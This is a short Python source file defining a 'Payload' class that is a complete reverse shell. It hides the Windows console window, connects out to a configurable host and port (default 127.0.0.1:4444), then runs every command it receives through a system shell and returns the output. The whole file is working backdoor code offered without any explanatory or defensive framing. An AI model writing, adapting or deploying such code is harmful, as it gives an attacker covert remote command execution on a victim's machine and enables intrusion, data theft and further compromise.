import socket
import time
import sys
import subprocess
import os

class Payload:
    def __init__(self, host='127.0.0.1', port=4444):
        self.host = host
        self.port = port
        self.socket = None

    def hide_console(self):
        if os.name == 'nt':
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def connect(self):
        for _ in range(5):
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                return True
            except:
                time.sleep(5)
        return False

    def execute_command(self, command):
        try:
            if command.strip().startswith('cd'):
                path = command.strip()[3:]
                os.chdir(path)
                return f"Changed directory to: {os.getcwd()}\n"
            
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
            return output.decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            return "Error: Command timeout (30s)\n"
        except Exception as e:
            return f"Error: {str(e)}\n"

    def run(self):
        self.hide_console()
        if not self.connect(): sys.exit(0)
        try:
            while True:
                command = self.socket.recv(4096).decode('utf-8').strip()
                if not command: break
                if command.lower() in ['exit', 'quit']:
                    self.socket.send(b"Goodbye!\n")
                    break
                output = self.execute_command(command)
                self.socket.send(output.encode())
        except: pass
        finally:
            if self.socket: self.socket.close()
            sys.exit(0)

if __name__ == "__main__":
    Payload().run()